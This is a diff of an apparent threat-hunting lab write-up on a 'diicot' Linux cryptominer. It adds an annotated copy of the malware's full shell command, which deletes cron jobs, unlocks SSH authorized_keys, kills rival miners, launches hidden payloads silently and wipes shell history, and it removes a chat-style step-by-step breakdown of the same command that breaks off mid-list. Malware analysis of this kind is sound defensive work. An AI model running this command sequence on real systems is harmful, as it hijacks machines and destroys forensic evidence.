@@ -175,10 +175,82 @@ DeviceFileEvents
 ```
 
 <img width="1035" height="393" alt="image" src="https://github.com/user-attachments/assets/dcc3a47c-84ca-4431-81ed-79a4bed88857" />
+
+<br>
+
+---
+
+### diicot
+
+- kuak and diicot created in tmp folder shortly after AHTKzAEv
+   - both files ran long code meant to terminate any existing miners
+<img width="1174" height="342" alt="image" src="https://github.com/user-attachments/assets/2161b4c2-df21-4a20-ba11-47370b34a5cc" />
+
+<br>
+<br>
+
+**Full malware command with annotations**
+```bash
+# --- Cleanup old folders & recreate working directory ---
+rm -rf /var/tmp/Documents /tmp/cache             # Remove old malware staging directories and temp files
+mkdir -p /var/tmp/Documents 2>&1                 # Recreate working directory
+
+# --- Remove cron jobs & SSH keys for stealth/control ---
+crontab -r                                       # Remove all user cron jobs
+chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1   # Remove immutable flags from SSH keys (so they can delete/replace)
+
+# --- Prep malware files ---
+cd /var/tmp
+chattr -iae /var/tmp/Documents/.diicot          # Remove immutable flags from previously staged .diicot
+mv /var/tmp/diicot /var/tmp/Documents/.diicot  # Move new diicot payload to working dir
+mv /var/tmp/kuak /var/tmp/Documents/kuak        # Move kuak shared library to working dir
+
+# --- Kill competing miners or Java apps ---
+pkill Opera
+pkill cnrig
+pkill java
+killall java
+pkill xmrig
+killall cnrig
+killall xmrig
+
+# --- Make all files in working dir executable ---
+cd /var/tmp/Documents
+chmod +x .*                                     # Recursive executable flags
+./.diicot >/dev/null 2>&1 & disown             # Run diicot in background silently
+
+# --- Cleanup shell history for stealth ---
+history -c
+rm -rf .bash_history ~/.bash_history
+
+# --- Prepare & execute cache payload ---
+cd /tmp/
+chmod +x cache
+./cache >/dev/null 2>&1 & disown
+history -c
+rm -rf .bash_history ~/.bash_history
+```
+
+- What this script is doing:
+   - Terminating any potential competing malware/miners to free up CPU/resources
+   - Setting up its working directory
+   - Moving payload files into a hidden location
+   - Making them executable
+   - Running them in the background
+   - Wiping evidence
  
+<br>
+
+<img width="643" height="583" alt="image" src="https://github.com/user-attachments/assets/d775f701-74fa-44bf-bda9-2ca113e9ff3b" /> <br>
+SOURCE: DarkTrace blog
+
+<br>
+
 ### Root Cron Persistence
 
-<img width="1280" height="393" alt="image" src="https://github.com/user-attachments/assets/befdedff-5972-4200-bc63-a321887ec73e" />
+<img width="1175" height="342" alt="image" src="https://github.com/user-attachments/assets/42f58afa-b9c0-4b16-a493-319739ba0942" />
+
+<br>
 
 start time: 2026-01-30T14:04:23.447447Z
 end: 2026-02-02T22:47:03.418251Z
@@ -211,8 +283,7 @@ This activity was automated and non-interactive
 
  <br>
  
-<img width="643" height="583" alt="image" src="https://github.com/user-attachments/assets/d775f701-74fa-44bf-bda9-2ca113e9ff3b" /> <br>
-SOURCE: DarkTrace blog
+<img width="1175" height="343" alt="image" src="https://github.com/user-attachments/assets/27adc996-b56a-4990-8b6d-688639596920" />
 
 <br>
 
@@ -407,169 +478,3 @@ Microsoft Defender for Endpoint successfully detected the malicious activity, en
 
 109.206.236.18
 Beaconing = the infected machine initiating an outbound connection to an attacker-controlled server.
-
-./network "rm -rf /var/tmp/Documents /tmp/cache ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ;  cd /tmp/ ;  chmod +x cache ; ./cache >/dev/null 2>&1 & disown  ; history -c ; rm -rf .bash_history ~/.bash_history"
-
-🔥 What This Script Is Doing (High-Level)
-
-This command is:
-
-Cleaning up previous infections
-
-Killing competing malware/miners
-
-Setting up its working directory
-
-Moving payload files into a hidden location
-
-Making them executable
-
-Running them in the background
-
-Wiping evidence
-
-This is a very typical Linux cryptominer deployment flow.
-
-🧹 Step 1 — Cleanup & Reset
-rm -rf /var/tmp/Documents /tmp/cache
-mkdir /var/tmp/Documents
-
-
-Deletes old copies of itself and recreates its working folder.
-
-So /var/tmp/Documents is its “base of operations.”
-
-⛔ Step 2 — Remove Persistence + SSH Protections
-crontab -r
-
-
-Deletes all scheduled cron jobs.
-This removes other malware persistence — or even legit jobs.
-
-chattr -iae ~/.ssh/authorized_keys
-
-
-Removes file immutability flags.
-
-This is interesting:
-
-chattr can make files undeletable.
-
-They remove attributes so they can modify SSH keys.
-
-This suggests:
-✔ They may insert their own SSH key later
-✔ Or they’re ensuring nothing blocks them
-
-💀 Step 3 — Kill Competing Miners
-pkill Opera
-pkill cnrig
-pkill xmrig
-pkill java
-killall java
-killall xmrig
-killall cnrig
-
-
-This is classic cryptominer turf war behavior.
-
-xmrig → Monero miner
-
-cnrig → Variant miner
-
-java → Many botnets use Java-based loaders
-
-Opera → Some miners disguise themselves as browser processes
-
-They are eliminating competition to own 100% of CPU.
-
-This strongly confirms:
-
-This is a mining bot.
-
-📦 Step 4 — Move Payloads to Hidden Location
-mv /var/tmp/diicot /var/tmp/Documents/.diicot
-mv /var/tmp/kuak /var/tmp/Documents/kuak
-
-
-Key observations:
-
-.diicot → Hidden file (dot prefix)
-
-kuak → Likely secondary loader or helper binary
-
-This is deliberate naming — not random.
-
-You asked earlier if it was random.
-It is not. It’s reused consistently across runs.
-
-⚙ Step 5 — Make Executable
-chmod +x .*
-
-
-Makes hidden files executable.
-
-🚀 Step 6 — Launch Payload in Background
-/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown
-
-
-Runs silently
-
-Redirects all output to null
-
-Backgrounds it
-
-Detaches from shell
-
-Stealth execution.
-
-Then:
-
-cd /tmp/
-chmod +x cache
-./cache >/dev/null 2>&1 & disown
-
-
-So there’s also a /tmp/cache binary running.
-
-This is likely:
-
-Main miner + watchdog
-
-Or miner + loader
-
-Two-process persistence pattern.
-
-🧽 Step 7 — Anti-Forensics
-history -c
-rm -rf .bash_history ~/.bash_history
-
-
-Clears command history.
-
-They do this twice — before and after launching processes.
-
-Very intentional.
-
-🧠 What’s Interesting Technically
-
-It removes cron jobs — but does not re-add one here.
-So persistence may happen inside .diicot.
-
-It manipulates authorized_keys attributes — suspicious.
-
-Uses /var/tmp not /tmp.
-/var/tmp survives reboots.
-
-Hidden filename .diicot
-That’s deliberate branding.
-
-The repetition in logs suggests:
-
-It keeps redeploying
-
-Or something keeps killing it and it relaunches
-
-🎯 Why It Keeps Repeating in Your Logs
-
-Likely one of:
